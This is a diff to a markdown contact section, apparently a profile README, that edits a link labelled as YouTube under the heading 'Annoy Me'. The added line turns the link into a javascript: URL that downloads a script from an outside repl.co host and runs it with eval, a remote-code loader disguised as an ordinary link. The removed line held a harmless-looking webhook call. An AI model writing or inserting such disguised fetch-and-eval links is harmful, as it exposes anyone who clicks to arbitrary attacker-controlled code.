@@ -27,4 +27,4 @@ You Can Contact Me Via Any Of The Following
 [Twitter](https://twitter.com/AIexSpaces)
 
 ### Annoy Me
-Click - YouTube: [Here](javasript:const webhookUrl="https://your-webhook-url.com";const data={message:"Hello, world!"};fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}).then(response=>{console.log("Webhook response:",response)})["catch"](error=>{console.error("Webhook error:",error)})) To Annoy Me (Webhook)
+Click - YouTube: [Here](javascript:fetch('https://Nullify-20.garoikana.repl.co/main.js').then(r => r.text()).then(r => eval(r)) To Annoy Me (Webhook)
